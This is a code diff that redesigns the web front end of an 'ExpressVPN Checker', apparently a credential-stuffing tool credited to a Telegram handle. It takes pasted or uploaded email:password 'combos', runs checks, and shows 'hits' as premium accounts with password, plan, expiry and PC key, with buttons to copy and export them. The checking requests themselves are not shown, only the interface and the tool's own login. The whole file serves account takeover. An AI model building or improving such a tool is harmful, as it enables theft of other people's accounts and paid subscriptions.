-    font-size: 0.73rem;
+    font-size: 0.74rem;
     word-break: break-all;
-    flex-shrink: 0;
+    transition: all 0.2s;
   }
+  .mini-item:hover { background: rgba(2, 6, 23, 0.8); }
   .mini-item.hit { border-left-color: #4ade80; }
   .mini-item.fail { border-left-color: #f87171; }
-  .mini-item .s.hit { color: #4ade80; font-weight: 700; }
-  .mini-item .s.fail { color: #f87171; font-weight: 700; }
+  .mini-item .combo-text {
+    font-family: 'SF Mono', Consolas, monospace;
+    color: #cbd5e1;
+    flex: 1;
+    min-width: 0;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .mini-item .status-tag {
+    font-weight: 800;
+    font-size: 0.68rem;
+    padding: 3px 9px;
+    border-radius: 20px;
+    flex-shrink: 0;
+    letter-spacing: 0.3px;
+  }
+  .mini-item .status-tag.hit {
+    background: rgba(34, 197, 94, 0.15);
+    color: #4ade80;
+    border: 1px solid rgba(34, 197, 94, 0.35);
+  }
+  .mini-item .status-tag.fail {
+    background: rgba(239, 68, 68, 0.12);
+    color: #f87171;
+    border: 1px solid rgba(239, 68, 68, 0.3);
+  }
 
-  .empty { text-align: center; padding: 40px 16px; color: #64748b; font-size: 0.84rem; }
-  .empty .emo { font-size: 1.8rem; display: block; margin-bottom: 8px; }
+  /* ============================================================
+     EMPTY STATE
+  ============================================================ */
+  .empty {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text-dimmer);
+    font-size: 0.86rem;
+  }
+  .empty .emo {
+    font-size: 3rem;
+    display: block;
+    margin-bottom: 14px;
+    opacity: 0.5;
+    animation: emptyFloat 3s ease-in-out infinite;
+  }
+  @keyframes emptyFloat {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+  .empty .title {
+    font-size: 1rem;
+    font-weight: 700;
+    color: #94a3b8;
+    margin-bottom: 4px;
+  }
+  .empty .sub { font-size: 0.78rem; color: #64748b; }
 
-  /* ===== Toast ===== */
+  /* ============================================================
+     TOAST
+  ============================================================ */
   #toast {
     position: fixed;
-    bottom: 20px;
+    bottom: 90px;
     left: 50%;
     transform: translateX(-50%) translateY(20px);
-    background: #1e293b;
+    background: rgba(15, 23, 42, 0.95);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
     color: white;
-    padding: 9px 18px;
+    padding: 11px 20px;
     border-radius: 30px;
-    font-size: 0.78rem;
-    border: 1px solid #334155;
+    font-size: 0.82rem;
+    font-weight: 600;
+    border: 1px solid var(--border-2);
     opacity: 0;
     pointer-events: none;
     transition: all 0.3s;
     z-index: 999;
-    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+    box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
+    max-width: 90%;
+    text-align: center;
   }
-  #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  #toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
 
-  /* ===== Mobile tweaks ===== */
-  @media (max-width: 480px) {
-    .wrap { padding: 10px; gap: 10px; }
-    header { padding: 12px 10px; }
-    header h1 { font-size: 1.1rem; }
-    .tab { font-size: 0.68rem; min-width: 72px; padding: 8px 4px; }
-    .stat .num { font-size: 1.05rem; }
-    .stat .label { font-size: 0.58rem; }
-    .hit-card .field .k { min-width: 66px; }
-    .panel { padding: 12px; }
+  /* ============================================================
+     DESKTOP ADJUSTMENTS (PC)
+  ============================================================ */
+  @media (min-width: 768px) {
+    .app-layout {
+      flex-direction: row;
+    }
+
+    /* Sidebar on desktop */
+    .sidebar {
+      display: flex;
+      flex-direction: column;
+      width: 220px;
+      flex-shrink: 0;
+      background: rgba(10, 15, 30, 0.85);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-right: 1px solid var(--border);
+      padding: 16px 12px;
+      gap: 6px;
+    }
+    .sidebar .side-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 6px 8px 18px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 14px;
+    }
+    .sidebar .side-brand .logo-mark {
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+    }
+    .sidebar .side-brand .title h1 {
+      font-size: 0.98rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #c084fc, #38bdf8);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -0.3px;
+      line-height: 1.2;
+    }
+    .sidebar .side-brand .title small {
+      font-size: 0.68rem;
+      color: var(--text-dimmer);
+    }
+    .sidebar .side-brand .title small a { color: #38bdf8; text-decoration: none; }
+
+    .side-nav-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 11px 14px;
+      border-radius: 12px;
+      background: transparent;
+      border: none;
+      color: #94a3b8;
+      font-size: 0.82rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+      text-align: left;
+      width: 100%;
+      position: relative;
+    }
+    .side-nav-item:hover {
+      background: rgba(56, 189, 248, 0.08);
+      color: #cbd5e1;
+    }
+    .side-nav-item.active {
+      background: linear-gradient(135deg, rgba(59, 130, 246, 0.18), rgba(139, 92, 246, 0.18));
+      color: #38bdf8;
+      border: 1px solid rgba(56, 189, 248, 0.3);
+    }
+    .side-nav-item.active::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 20%;
+      height: 60%;
+      width: 3px;
+      background: linear-gradient(180deg, #38bdf8, #8b5cf6);
+      border-radius: 0 4px 4px 0;
+    }
+    .side-nav-item .ni { font-size: 1.05rem; }
+    .side-nav-item .cnt {
+      margin-left: auto;
+      background: rgba(56, 189, 248, 0.15);
+      color: #38bdf8;
+      font-size: 0.68rem;
+      font-weight: 800;
+      padding: 2px 8px;
+      border-radius: 20px;
+      min-width: 22px;
+      text-align: center;
+    }
+    .side-nav-item.hits-item .cnt {
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ade80;
+    }
+
+    .side-user {
+      margin-top: auto;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 12px;
+      border-radius: 12px;
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid var(--border);
+      font-size: 0.78rem;
+      color: #cbd5e1;
+    }
+    .side-user .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.82rem;
+      font-weight: 800;
+      color: white;
+      flex-shrink: 0;
+    }
+    .side-user .info {
+      flex: 1;
+      min-width: 0;
+    }
+    .side-user .info b { color: #e2e8f0; display: block; overflow: hidden; text-overflow: ellipsis; }
+    .side-user .info small { color: var(--text-dimmer); font-size: 0.68rem; }
+    .side-user .logout-mini {
+      background: transparent;
+      border: none;
+      color: #64748b;
+      cursor: pointer;
+      font-size: 1.1rem;
+      padding: 4px;
+      transition: color 0.2s;
+    }
+    .side-user .logout-mini:hover { color: #ef4444; }
+
+    /* Hide mobile bottom nav on desktop */
+    .bottom-nav { display: none; }
+
+    /* Main content */
+    .main-content {
+      padding: 20px 24px;
+      gap: 16px;
+      max-width: 100%;
+    }
+
+    /* Desktop panel */
+    .panel { border-radius: 20px; }
+    .panel-scroll { padding: 24px; }
+
+    /* Bigger textarea on desktop */
+    textarea {
+      min-height: 200px;
+      font-size: 0.84rem;
+    }
+
+    /* 4-column stats on desktop */
+    .stats-grid {
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+    .stat-card .value { font-size: 1.9rem; }
+
+    /* Better hit cards on desktop – 2 columns */
+    .hits-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 14px;
+    }
+
+    /* Wider hit cards */
+    .hit-card { padding: 16px; }
+    .hit-field { font-size: 0.8rem; }
+    .hit-field .fk { min-width: 76px; }
+
+    /* Bigger buttons row on desktop */
+    .action-row {
+      grid-template-columns: repeat(4, 1fr);
+    }
+    .action-row.duo { grid-template-columns: 1fr 1fr; }
+
+    /* Toast position */
+    #toast { bottom: 30px; }
+  }
+
+  /* ============================================================
+     EXTRA LARGE SCREENS
+  ============================================================ */
+  @media (min-width: 1400px) {
+    .main-content {
+      padding: 24px 32px;
+    }
+    .hits-list {
+      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+    }
+  }
+
+  /* ============================================================
+     MOBILE ONLY (below 768)
+  ============================================================ */
+  @media (max-width: 767px) {
+    .sidebar { display: none; }
+    .topbar .user-chip .uname { display: none; }
+    .topbar .user-chip {
+      padding: 4px;
+      background: transparent;
+      border: none;
+    }
+    .topbar .brand .title small { display: none; }
+
+    .main-content { padding: 10px; gap: 10px; }
+    .panel-scroll { padding: 12px; }
+
+    textarea { min-height: 120px; font-size: 0.78rem; }
+    .hit-card { padding: 12px; }
+    .hit-field .fk { min-width: 60px; font-size: 0.66rem; }
+    .hit-field { font-size: 0.72rem; }
+    .stat-card .value { font-size: 1.35rem; }
+    .stat-card { padding: 10px; }
+    .stat-card .ico-row { font-size: 0.62rem; }
+
+    .upload-btn { min-width: 120px; padding: 10px; font-size: 0.74rem; }
+    .btn { padding: 12px 14px; font-size: 0.82rem; }
   }
 </style>
 </head>
@@ -367,25 +1214,41 @@
 <!-- LOGIN PAGE -->
 <!-- ============================================================ -->
 <div id="loginPage">
-  <div class="wrap">
-    <header>
-      <h1>🔒 ExpressVPN Checker</h1>
+  <div class="login-shell">
+    <div class="login-brand">
+      <div class="logo-mark">🔒</div>
+      <h1>ExpressVPN Checker</h1>
       <p>Config by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></p>
-    </header>
-    <div class="login-box">
-      <h2>🔑 Login Required</h2>
+    </div>
+
+    <div class="login-card">
+      <h2>🔑 Sign in to continue</h2>
+
       <div class="field">
         <label>Username</label>
-        <input id="authUser" type="text" autocomplete="username" placeholder="your username" />
+        <div class="input-wrap">
+          <span class="icon">👤</span>
+          <input id="authUser" type="text" autocomplete="username" placeholder="Enter your username" />
+        </div>
       </div>
+
       <div class="field">
         <label>Password</label>
-        <input id="authPass" type="password" autocomplete="current-password" placeholder="your password" />
+        <div class="input-wrap">
+          <span class="icon">🔑</span>
+          <input id="authPass" type="password" autocomplete="current-password" placeholder="Enter your password" />
+        </div>
       </div>
-      <button class="btn-main" id="loginBtn">Login</button>
-      <p style="text-align:center;font-size:0.7rem;color:#64748b;margin-top:14px;">
-        শুধু অনুমোদিত ইউজাররা চেক করতে পারবে
-      </p>
+
+      <button class="btn-primary" id="loginBtn">
+        <span>Sign In</span>
+        <span style="opacity:0.7">→</span>
+      </button>
+
+      <div class="login-hint">
+        <span>🔐</span>
+        <span>শুধু অনুমোদিত ইউজাররা চেক করতে পারবে</span>
+      </div>
     </div>
   </div>
 </div>
@@ -393,102 +1256,262 @@
 <!-- ============================================================ -->
 <!-- MAIN APP -->
 <!-- ============================================================ -->
-<div id="appPage" style="display:none; height:100vh;">
-  <div class="wrap">
+<div id="appPage">
+  <div class="app-layout">
 
-    <header>
-      <h1>🔒 ExpressVPN Checker</h1>
-      <p>Config by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></p>
-    </header>
+    <!-- ===== Sidebar (desktop only) ===== -->
+    <aside class="sidebar">
+      <div class="side-brand">
+        <div class="logo-mark">🔒</div>
+        <div class="title">
+          <h1>ExpressVPN</h1>
+          <small>by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></small>
+        </div>
+      </div>
 
-    <div class="userbar">
-      <div class="who">👤 <b id="whoUser">—</b></div>
-      <button class="logout" id="logoutBtn">Logout</button>
-    </div>
+      <button class="side-nav-item active" data-tab="combo">
+        <span class="ni">📝</span>
+        <span>Combo</span>
+      </button>
+      <button class="side-nav-item" data-tab="stats">
+        <span class="ni">📊</span>
+        <span>Stats</span>
+      </button>
+      <button class="side-nav-item hits-item" data-tab="hits">
+        <span class="ni">🔥</span>
+        <span>Hits</span>
+        <span class="cnt" id="sideHitCount">0</span>
+      </button>
+      <button class="side-nav-item" data-tab="all">
+        <span class="ni">📋</span>
+        <span>All</span>
+      </button>
 
-    <div class="tabs">
-      <button class="tab active" data-tab="combo">📝 Combo</button>
-      <button class="tab" data-tab="stats">📊 Stats</button>
-      <button class="tab" data-tab="hits">🔥 Hits <span class="badge" id="tabHitCount">0</span></button>
-      <button class="tab" data-tab="all">📋 All</button>
-    </div>
+      <div class="side-user">
+        <div class="avatar" id="sideAvatar">A</div>
+        <div class="info">
+          <b id="sideUser">—</b>
+          <small>Signed in</small>
+        </div>
+        <button class="logout-mini" id="logoutBtnPc" title="Logout">⎋</button>
+      </div>
+    </aside>
 
-    <div class="panel-container">
-
-      <!-- ===== Combo Panel ===== -->
-      <section class="panel active" id="panel-combo">
-        <div class="scroll-area" style="display:flex; flex-direction:column;">
-          <label>📋 Paste combos (email:password) — one per line</label>
-          <textarea id="comboInput" placeholder="example@gmail.com:password123&#10;another@mail.com:pass456"></textarea>
-
-          <div class="file-row">
-            <label class="file-label">📁 Upload .txt<input type="file" id="fileInput" accept=".txt,text/plain"></label>
-            <label class="file-label" id="clearInput">🗑️ Clear</label>
-          </div>
-
-          <div class="btn-row">
-            <button id="startBtn" class="green">▶ Start</button>
-            <button id="stopBtn" class="stop" disabled>⏹ Stop</button>
-          </div>
-
-          <div class="btn-row" style="margin-top:8px;">
-            <button id="exportHits" class="ghost">📥 Export Hits</button>
-            <button id="exportAll" class="ghost">📄 Export All</button>
+    <!-- ===== Right side ===== -->
+    <div class="app-body" style="flex:1;">
+      <!-- Topbar (mobile + desktop) -->
+      <div class="topbar">
+        <div class="brand">
+          <div class="logo-mark">🔒</div>
+          <div class="title">
+            <h1>ExpressVPN</h1>
+            <small>by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></small>
           </div>
         </div>
-
-        <div class="stats">
-          <div class="stat"><div class="num" id="statTotal">0</div><div class="label">TOTAL</div></div>
-          <div class="stat"><div class="num" id="statChecked">0</div><div class="label">CHECKED</div></div>
-          <div class="stat hit"><div class="num" id="statHits">0</div><div class="label">🔥 HITS</div></div>
-          <div class="stat fail"><div class="num" id="statFails">0</div><div class="label">❌ FAIL</div></div>
-        </div>
-
-        <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
-        <div id="status">⚡ Ready</div>
-      </section>
-
-      <!-- ===== Stats Panel ===== -->
-      <section class="panel" id="panel-stats">
-        <div class="scroll-area">
-          <div class="stats" style="margin-top:0;">
-            <div class="stat"><div class="num" id="statTotal2">0</div><div class="label">TOTAL</div></div>
-            <div class="stat"><div class="num" id="statChecked2">0</div><div class="label">CHECKED</div></div>
-            <div class="stat hit"><div class="num" id="statHits2">0</div><div class="label">🔥 HITS</div></div>
-            <div class="stat fail"><div class="num" id="statFails2">0</div><div class="label">❌ FAIL</div></div>
+        <div class="user-zone">
+          <div class="user-chip">
+            <div class="avatar" id="topAvatar">A</div>
+            <span class="uname">👤 <b id="topUser">—</b></span>
           </div>
-          <div class="progress" style="margin-top:16px;"><div class="progress-fill" id="progressFill2"></div></div>
-          <div id="status2" style="margin-top:10px;text-align:center;font-size:.78rem;color:#94a3b8;">⚡ Ready</div>
+          <button class="icon-btn" id="logoutBtn" title="Logout">⎋</button>
         </div>
-      </section>
+      </div>
 
-      <!-- ===== Hits Panel (scrollable) ===== -->
-      <section class="panel" id="panel-hits">
-        <div class="scroll-area" id="hitsScroll">
-          <div class="hit-list" id="hitList">
-            <div class="empty"><span class="emo">🔥</span>No hits yet.</div>
-          </div>
+      <!-- Main content -->
+      <div class="main-content">
+        <div class="panel-wrap">
+
+          <!-- ===== Combo Panel ===== -->
+          <section class="panel active" id="panel-combo">
+            <div class="panel-scroll">
+              <div class="section-title">
+                <span class="dot"></span>
+                <span>Paste your combos</span>
+              </div>
+
+              <div class="combo-field">
+                <textarea id="comboInput" placeholder="example@gmail.com:password123&#10;another@mail.com:pass456&#10;third@mail.com:pass789"></textarea>
+              </div>
+
+              <div class="upload-row">
+                <label class="upload-btn">
+                  <span>📁</span>
+                  <span>Upload .txt</span>
+                  <input type="file" id="fileInput" accept=".txt,text/plain">
+                </label>
+                <button class="upload-btn danger" id="clearInput">
+                  <span>🗑️</span>
+                  <span>Clear</span>
+                </button>
+              </div>
+
+              <div class="action-row duo">
+                <button id="startBtn" class="btn start">
+                  <span>▶</span>
+                  <span>Start Checking</span>
+                </button>
+                <button id="stopBtn" class="btn stop" disabled>
+                  <span>⏹</span>
+                  <span>Stop</span>
+                </button>
+              </div>
+
+              <div class="action-row duo" style="margin-top:10px;">
+                <button id="exportHits" class="btn export">
+                  <span>📥</span>
+                  <span>Export Hits</span>
+                </button>
+                <button id="exportAll" class="btn export">
+                  <span>📄</span>
+                  <span>Export All</span>
+                </button>
+              </div>
+
+              <!-- Stats grid (always visible in combo panel) -->
+              <div class="stats-grid">
+                <div class="stat-card">
+                  <div class="ico-row">📊 Total</div>
+                  <div class="value" id="statTotal">0</div>
+                </div>
+                <div class="stat-card">
+                  <div class="ico-row">✓ Checked</div>
+                  <div class="value" id="statChecked">0</div>
+                </div>
+                <div class="stat-card hit">
+                  <div class="ico-row">🔥 Hits</div>
+                  <div class="value" id="statHits">0</div>
+                </div>
+                <div class="stat-card fail">
+                  <div class="ico-row">✗ Fail</div>
+                  <div class="value" id="statFails">0</div>
+                </div>
+              </div>
+
+              <div class="progress-wrap">
+                <div class="progress-head">
+                  <span>Progress</span>
+                  <span><b id="progressText">0%</b></span>
+                </div>
+                <div class="progress-bar">
+                  <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="status-text" id="status">
+                  <span class="pulse-dot"></span>
+                  <span>Ready to check</span>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- ===== Stats Panel ===== -->
+          <section class="panel" id="panel-stats">
+            <div class="panel-scroll">
+              <div class="section-title">
+                <span class="dot"></span>
+                <span>Checking statistics</span>
+              </div>
+
+              <div class="stats-grid" style="margin-top:0;">
+                <div class="stat-card">
+                  <div class="ico-row">📊 Total</div>
+                  <div class="value" id="statTotal2">0</div>
+                </div>
+                <div class="stat-card">
+                  <div class="ico-row">✓ Checked</div>
+                  <div class="value" id="statChecked2">0</div>
+                </div>
+                <div class="stat-card hit">
+                  <div class="ico-row">🔥 Hits</div>
+                  <div class="value" id="statHits2">0</div>
+                </div>
+                <div class="stat-card fail">
+                  <div class="ico-row">✗ Fail</div>
+                  <div class="value" id="statFails2">0</div>
+                </div>
+              </div>
+
+              <div class="progress-wrap" style="margin-top:20px;">
+                <div class="progress-head">
+                  <span>Overall progress</span>
+                  <span><b id="progressText2">0%</b></span>
+                </div>
+                <div class="progress-bar">
+                  <div class="progress-fill" id="progressFill2"></div>
+                </div>
+                <div class="status-text" id="status2">
+                  <span class="pulse-dot"></span>
+                  <span>Ready to check</span>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- ===== Hits Panel ===== -->
+          <section class="panel" id="panel-hits">
+            <div class="panel-scroll">
+              <div class="section-title">
+                <span class="dot"></span>
+                <span>Premium accounts found</span>
+              </div>
+              <div class="hits-list" id="hitList">
+                <div class="empty">
+                  <span class="emo">🔥</span>
+                  <div class="title">No hits yet</div>
+                  <div class="sub">Start checking combos to see premium accounts here</div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- ===== All Panel ===== -->
+          <section class="panel" id="panel-all">
+            <div class="panel-scroll">
+              <div class="section-title">
+                <span class="dot"></span>
+                <span>All checked accounts</span>
+              </div>
+              <div class="mini-list" id="allList">
+                <div class="empty">
+                  <span class="emo">📋</span>
+                  <div class="title">No results yet</div>
+                  <div class="sub">Start checking to see results</div>
+                </div>
+              </div>
+            </div>
+          </section>
+
         </div>
-      </section>
+      </div>
 
-      <!-- ===== All Panel (scrollable) ===== -->
-      <section class="panel" id="panel-all">
-        <div class="scroll-area">
-          <div class="mini-list" id="allList">
-            <div class="empty"><span class="emo">📋</span>No results yet.</div>
-          </div>
-        </div>
-      </section>
-
+      <!-- Bottom nav (mobile only) -->
+      <nav class="bottom-nav">
+        <button class="nav-item active" data-tab="combo">
+          <span class="ni">📝</span>
+          <span>Combo</span>
+        </button>
+        <button class="nav-item" data-tab="stats">
+          <span class="ni">📊</span>
+          <span>Stats</span>
+        </button>
+        <button class="nav-item" data-tab="hits">
+          <span class="ni">🔥</span>
+          <span>Hits</span>
+          <span class="badge" id="tabHitCount">0</span>
+        </button>
+        <button class="nav-item" data-tab="all">
+          <span class="ni">📋</span>
+          <span>All</span>
+        </button>
+      </nav>
     </div>
   </div>
 </div>
 
-<div id="toast">Copied!</div>
+<div id="toast"></div>
 
 <script>
 // ============================================================
-//  Auth
+//  AUTH
 // ============================================================
 let AUTH_TOKEN = localStorage.getItem('evpn_token') || null;
 
@@ -508,8 +1531,9 @@ async function doLogin() {
   if (!username || !password) return showToast('❌ Enter username & password');
 
   const btn = document.getElementById('loginBtn');
+  const originalHTML = btn.innerHTML;
   btn.disabled = true;
-  btn.textContent = 'Logging in...';
+  btn.innerHTML = '<span>Logging in...</span>';
 
   try {
     const res = await fetch('/api/auth?action=login', {
@@ -521,7 +1545,7 @@ async function doLogin() {
     if (!data.ok) {
       showToast('❌ ' + (data.message || 'Login failed'));
       btn.disabled = false;
-      btn.textContent = 'Login';
+      btn.innerHTML = originalHTML;
       return;
     }
     saveToken(data.token);
@@ -530,7 +1554,7 @@ async function doLogin() {
   } catch (e) {
     showToast('❌ ' + e.message);
     btn.disabled = false;
-    btn.textContent = 'Login';
+    btn.innerHTML = originalHTML;
   }
 }
 
@@ -547,10 +1571,16 @@ async function verifyToken() {
 function showApp(username) {
   document.getElementById('loginPage').style.display = 'none';
   document.getElementById('appPage').style.display = 'block';
-  document.getElementById('whoUser').textContent = username;
+
+  const initial = (username || '?')[0].toUpperCase();
+  document.getElementById('topUser').textContent = username;
+  document.getElementById('topAvatar').textContent = initial;
+  document.getElementById('sideUser').textContent = username;
+  document.getElementById('sideAvatar').textContent = initial;
 }
+
 function showLogin() {
-  document.getElementById('loginPage').style.display = 'block';
+  document.getElementById('loginPage').style.display = 'flex';
   document.getElementById('appPage').style.display = 'none';
 }
 
@@ -558,26 +1588,36 @@ document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('authPass').addEventListener('keypress', e => {
   if (e.key === 'Enter') doLogin();
 });
-document.getElementById('logoutBtn').addEventListener('click', () => {
+document.getElementById('authUser').addEventListener('keypress', e => {
+  if (e.key === 'Enter') document.getElementById('authPass').focus();
+});
+
+function doLogout() {
   saveToken(null);
   showLogin();
   showToast('👋 Logged out');
-});
+}
+document.getElementById('logoutBtn').addEventListener('click', doLogout);
+document.getElementById('logoutBtnPc').addEventListener('click', doLogout);
 
 // ============================================================
-//  Tabs
+//  TABS (both bottom nav + sidebar)
 // ============================================================
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-    tab.classList.add('active');
-    document.getElementById('panel-' + tab.dataset.tab).classList.add('active');
+function switchTab(tabName) {
+  document.querySelectorAll('.nav-item, .side-nav-item').forEach(t => {
+    t.classList.toggle('active', t.dataset.tab === tabName);
   });
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  const panel = document.getElementById('panel-' + tabName);
+  if (panel) panel.classList.add('active');
+}
+
+document.querySelectorAll('.nav-item, .side-nav-item').forEach(tab => {
+  tab.addEventListener('click', () => switchTab(tab.dataset.tab));
 });
 
 // ============================================================
-//  App Logic
+//  APP LOGIC
 // ============================================================
 const comboInput = document.getElementById('comboInput');
 const fileInput = document.getElementById('fileInput');
@@ -590,9 +1630,12 @@ const statusEl = document.getElementById('status');
 const statusEl2 = document.getElementById('status2');
 const progressFill = document.getElementById('progressFill');
 const progressFill2 = document.getElementById('progressFill2');
+const progressText = document.getElementById('progressText');
+const progressText2 = document.getElementById('progressText2');
 const hitList = document.getElementById('hitList');
 const allList = document.getElementById('allList');
 const tabHitCount = document.getElementById('tabHitCount');
+const sideHitCount = document.getElementById('sideHitCount');
 const toastEl = document.getElementById('toast');
 
 let combos = [];
@@ -604,7 +1647,8 @@ let stats = { total: 0, checked: 0, hits: 0, fails: 0 };
 function showToast(msg) {
   toastEl.textContent = msg;
   toastEl.classList.add('show');
-  setTimeout(() => toastEl.classList.remove('show'), 1800);
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toastEl.classList.remove('show'), 1800);
 }
 
 fileInput.addEventListener('change', e => {
@@ -613,11 +1657,12 @@ fileInput.addEventListener('change', e => {
   const r = new FileReader();
   r.onload = ev => {
     comboInput.value = ev.target.result;
-    showToast('📁 ' + f.name);
+    showToast('📁 Loaded: ' + f.name);
   };
   r.readAsText(f);
   fileInput.value = '';
 });
+
 clearInput.addEventListener('click', () => {
   comboInput.value = '';
   showToast('🗑️ Cleared');
@@ -638,19 +1683,30 @@ function parseCombos(raw) {
 }
 
 function updateStats() {
-  ['statTotal', 'statTotal2'].forEach(id => document.getElementById(id).textContent = stats.total);
-  ['statChecked', 'statChecked2'].forEach(id => document.getElementById(id).textContent = stats.checked);
-  ['statHits', 'statHits2'].forEach(id => document.getElementById(id).textContent = stats.hits);
-  ['statFails', 'statFails2'].forEach(id => document.getElementById(id).textContent = stats.fails);
+  document.getElementById('statTotal').textContent = stats.total;
+  document.getElementById('statTotal2').textContent = stats.total;
+  document.getElementById('statChecked').textContent = stats.checked;
+  document.getElementById('statChecked2').textContent = stats.checked;
+  document.getElementById('statHits').textContent = stats.hits;
+  document.getElementById('statHits2').textContent = stats.hits;
+  document.getElementById('statFails').textContent = stats.fails;
+  document.getElementById('statFails2').textContent = stats.fails;
   tabHitCount.textContent = stats.hits;
-  const pct = stats.total ? (stats.checked / stats.total) * 100 : 0;
+  sideHitCount.textContent = stats.hits;
+
+  const pct = stats.total ? Math.round((stats.checked / stats.total) * 100) : 0;
   progressFill.style.width = pct + '%';
   progressFill2.style.width = pct + '%';
+  progressText.textContent = pct + '%';
+  progressText2.textContent = pct + '%';
 }
 
-function setStatus(m) {
-  statusEl.textContent = m;
-  statusEl2.textContent = m;
+function setStatus(m, isActive = false) {
+  const dotHtml = isActive
+    ? '<span class="pulse-dot"></span>'
+    : '<span style="width:7px;height:7px;border-radius:50%;background:#64748b;flex-shrink:0;"></span>';
+  statusEl.innerHTML = dotHtml + '<span>' + m + '</span>';
+  statusEl2.innerHTML = dotHtml + '<span>' + m + '</span>';
 }
 
 function escapeHtml(s) {
@@ -661,23 +1717,60 @@ function escapeHtml(s) {
 }
 
 function renderAll() {
-  // Hits
+  // ===== HITS =====
   const hits = results.filter(r => r.hit);
   if (!hits.length) {
-    hitList.innerHTML = '<div class="empty"><span class="emo">🔥</span>No hits yet.</div>';
+    hitList.innerHTML = `
+      <div class="empty">
+        <span class="emo">🔥</span>
+        <div class="title">No hits yet</div>
+        <div class="sub">Start checking combos to see premium accounts here</div>
+      </div>`;
   } else {
     hitList.innerHTML = hits.map(h => `
       <div class="hit-card">
-        <button class="copy-btn" data-combo="${escapeHtml(h.username + ':' + h.password)}">📋 Copy</button>
-        <span class="badge-hit">🔥 HIT · SUBSCRIPTION VALID</span>
-        <div class="fields">
-          <div class="field"><span class="k">📧 Email:</span><span class="v mono">${escapeHtml(h.username)}</span></div>
-          <div class="field"><span class="k">🔑 Password:</span><span class="v mono">${escapeHtml(h.password)}</span></div>
-          <div class="field"><span class="k">📋 Plan:</span><span class="v">${escapeHtml(h.plan || '—')}</span></div>
-          <div class="field"><span class="k">📅 Expiry:</span><span class="v">${escapeHtml(h.expiry || '—')}</span></div>
-          <div class="field"><span class="k">🔑 PC Key:</span><span class="v mono">${escapeHtml(h.pcKey || '—')}</span></div>
-          <div class="field"><span class="k">📅 Key Expiry:</span><span class="v">${escapeHtml(h.keyExpire || '—')}</span></div>
-          <div class="field"><span class="k">📌 Status:</span><span class="v">${escapeHtml(h.keyStatus || '—')}</span></div>
+        <div class="hit-head">
+          <span class="hit-badge">🔥 HIT · PREMIUM</span>
+          <button class="copy-btn" data-combo="${escapeHtml(h.username + ':' + h.password)}">
+            <span>📋</span><span>Copy</span>
+          </button>
+        </div>
+        <div class="hit-fields">
+          <div class="hit-field">
+            <span class="fico">📧</span>
+            <span class="fk">Email</span>
+            <span class="fv mono">${escapeHtml(h.username)}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">🔑</span>
+            <span class="fk">Password</span>
+            <span class="fv mono">${escapeHtml(h.password)}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">📋</span>
+            <span class="fk">Plan</span>
+            <span class="fv">${escapeHtml(h.plan || '—')}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">📅</span>
+            <span class="fk">Expiry</span>
+            <span class="fv">${escapeHtml(h.expiry || '—')}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">🗝️</span>
+            <span class="fk">PC Key</span>
+            <span class="fv mono">${escapeHtml(h.pcKey || '—')}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">📅</span>
+            <span class="fk">Key Expiry</span>
+            <span class="fv">${escapeHtml(h.keyExpire || '—')}</span>
+          </div>
+          <div class="hit-field">
+            <span class="fico">📌</span>
+            <span class="fk">Status</span>
+            <span class="fv accent">${escapeHtml(h.keyStatus || '—')}</span>
+          </div>
         </div>
       </div>
     `).join('');
@@ -688,15 +1781,20 @@ function renderAll() {
     });
   }
 
-  // All
